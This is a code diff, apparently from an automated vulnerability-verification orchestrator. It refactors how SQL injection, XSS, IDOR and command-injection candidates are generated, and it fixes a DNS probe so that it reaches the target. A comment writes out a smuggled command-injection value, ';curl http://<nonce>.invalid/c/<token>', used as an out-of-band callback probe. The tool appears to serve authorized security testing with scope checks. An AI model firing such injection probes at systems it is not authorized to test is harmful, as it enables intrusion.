@@ -292,6 +292,24 @@ CRAWL_FORM_EVIDENCE_KIND = "crawl-form"
 # 小写去扩展名后精确匹配。宁漏勿滥——每条候选消耗一次 L2 确认与行为验证
 _SQLI_PATH_HINTS = frozenset({"sqli", "sql", "login", "signin", "search"})
 
+#: param-endpoint → 各漏洞类型的**参数键提示表**（M19-a：规则表入口的单一真相源）。
+#:
+#: 顺序即候选生成顺序（sqli → xss → idor → cmdi），与拆分前的
+#: 「sqli 列表推导 + 三个 extend」逐条等价。
+#:
+#: **新增提示表必须登记在此**：`tests/test_vuln_registry.py` 的断言
+#: ``test_param_hint_tables_are_all_registered`` 要求模块里每个
+#: ``_*_PARAM_HINTS`` 都出现在本表，生产者穷举器也从本表派生——于是
+#: 「加了一张表但枚举器没跟上」不会再静默发生（M18-b 已经实际发生过一次：
+#: `_CMDI_PARAM_HINTS` 的 21 键里有 17 键从未被穷举器喂过，cmdi 只是碰巧靠
+#: `file`/`query` 等 4 个交集键通过）。
+_PARAM_HINT_TABLES: dict[str, tuple[frozenset[str], str]] = {
+    "sqli": (_SQLI_PARAM_HINTS, "medium"),
+    "xss": (_XSS_PARAM_HINTS, "medium"),
+    "idor": (_IDOR_PARAM_HINTS, "medium"),
+    "cmdi": (_CMDI_PARAM_HINTS, "critical"),
+}
+
 
 class _TriageCandidate(NamedTuple):
     """一条 triage 候选；一个 Signal 可展开多条（按参数键/表单字段名）。"""
@@ -406,59 +424,24 @@ def _triage_candidates(
         return candidates
     if signal.kind == "param-endpoint":
         keys = _query_param_keys(signal.asset)
-        candidates = [
-            _TriageCandidate(
-                vuln_type="sqli",
-                param=key,
-                severity="medium",
-                evidence_kind=CRAWL_ENDPOINT_EVIDENCE_KIND,
-                source="get_param",
+        candidates: list[_TriageCandidate] = []
+        # M19-a：四类参数键提示表由 `_PARAM_HINT_TABLES` **派生**（登记顺序即
+        # 生成顺序，与拆分前的「sqli 列表推导 + 三个 extend」逐条等价）。
+        # 表间交集参数会同产多条候选（`id` 既可能注入也可能越权、`query` 既可能
+        # 进 SQL 也可能进 shell），dedup 按 vuln_type 分量区分，各自经独立
+        # verify skill 行为验证。
+        for vuln_type, (hints, severity) in _PARAM_HINT_TABLES.items():
+            candidates.extend(
+                _TriageCandidate(
+                    vuln_type=vuln_type,
+                    param=key,
+                    severity=severity,
+                    evidence_kind=CRAWL_ENDPOINT_EVIDENCE_KIND,
+                    source="get_param",
+                )
+                for key in keys
+                if key in hints
             )
-            for key in keys
-            if key in _SQLI_PARAM_HINTS
-        ]
-        # M8b：同一份 query 键再按 XSS 提示表展开 xss 候选（两表交集参数
-        # 会同产 sqli+xss 两条候选，dedup 按 vuln_type 分量区分）
-        candidates.extend(
-            _TriageCandidate(
-                vuln_type="xss",
-                param=key,
-                severity="medium",
-                evidence_kind=CRAWL_ENDPOINT_EVIDENCE_KIND,
-                source="get_param",
-            )
-            for key in keys
-            if key in _XSS_PARAM_HINTS
-        )
-        # M8c：同一份 query 键再按 IDOR 提示表展开 idor 候选（与 sqli 表
-        # 交集参数同产是设计行为——id 类键既可能注入也可能越权，各自经
-        # 独立 verify skill 行为验证）
-        candidates.extend(
-            _TriageCandidate(
-                vuln_type="idor",
-                param=key,
-                severity="medium",
-                evidence_kind=CRAWL_ENDPOINT_EVIDENCE_KIND,
-                source="get_param",
-            )
-            for key in keys
-            if key in _IDOR_PARAM_HINTS
-        )
-        # M18-b：同一份 query 键再按 cmdi 提示表展开命令注入候选（裁定 C3：
-        # 与 sqli/xss/idor 同待遇，独立上限与独立 triage_capped 事件）。
-        # 与 `file`/`path`/`query` 等键的交集同产是设计行为——同一个参数
-        # 既可能被拼进 SQL 也可能被拼进 shell，各自经独立 verify skill 行为验证。
-        candidates.extend(
-            _TriageCandidate(
-                vuln_type="cmdi",
-                param=key,
-                severity="critical",
-                evidence_kind=CRAWL_ENDPOINT_EVIDENCE_KIND,
-                source="get_param",
-            )
-            for key in keys
-            if key in _CMDI_PARAM_HINTS
-        )
         return candidates
     if signal.kind == "form_page":
         # M8a：表单字段名命中提示表 → 每字段一条候选（dedup 带 param 分量）；
@@ -2534,7 +2517,6 @@ class Orchestrator:
         # 会话**可选**：有就带上（更贴近操作员的真实请求），没有也能验证
         session = self._session()
 
-        asset_origin = _origin_of(finding.asset)
         probes: list[dict] = []
         errored = False
         hit: tuple[str, str, list[dict]] | None = None
@@ -2550,7 +2532,9 @@ class Orchestrator:
             """
             nonlocal errored
             # 同源自检：**载荷**探测 URL 必须与已授权的 asset 完全同源（红线 5）。
-            # DNS 非命中探针刻意指向不可解析主机，不受本检约束。
+            # ``infrastructure=True`` 只用于 DNS 非命中探针：它的 URL 同样由 asset
+            # 构造（因而同源），但"目标解析不了这个随机主机名"是**预期结果**，故其
+            # 失败不计入 errored——否则每次干净未命中都会被判 blocked。
             if not infrastructure and not cmdi_same_origin(url, finding.asset):
                 self.audit.record(
                     "verify_scope_rejected",
@@ -2600,9 +2584,16 @@ class Orchestrator:
 
         # 3. DNS 非命中变体（先做：它命中就说明本次观测不可信，无需再打目标）
         dns_token = new_cmdi_token()
-        dns_value, dns_url = cmdi_dns_probe_value(
+        dns_value, dns_control_url = cmdi_dns_probe_value(
             ssrf_new_nonce_host(), bound_port, dns_token
         )
+        # **必须投递到靶**：把 `;curl http://<nonce>.invalid/c/<token>` 作为**目标
+        # 参数值**发出去。只有靶（或其前置中间件）真的收到了这次抓取尝试，
+        # "第三方代抓取"才可能被观测到——宿主自己去取那个 `.invalid` 地址等于什么
+        # 都没测。M18-a 实现期此处误把**对照地址本身**当成探测 URL（`dns_value`
+        # 算完就丢了）⇒ 该变体从未到达靶，`dns_misfire` 恒为 False，而 Confirmed
+        # 的证据文本仍声称"已排除第三方代抓取"（无观测支撑的陈述）。
+        dns_url = cmdi_build_probe_url(finding.asset, finding.param, dns_value)
         _dns_resp, dns_records = run_probe(
             0, DNS_VARIANT, dns_url, dns_token, infrastructure=True
         )
@@ -2672,6 +2663,7 @@ class Orchestrator:
                             "callback_listener": f"{bound_host}:{bound_port}",
                             "delivery_probe_url": delivery_url,
                             "dns_probe_url": dns_url,
+                            "dns_control_url": dns_control_url,
                             **judgment.to_dict(),
                         },
                         ensure_ascii=False,
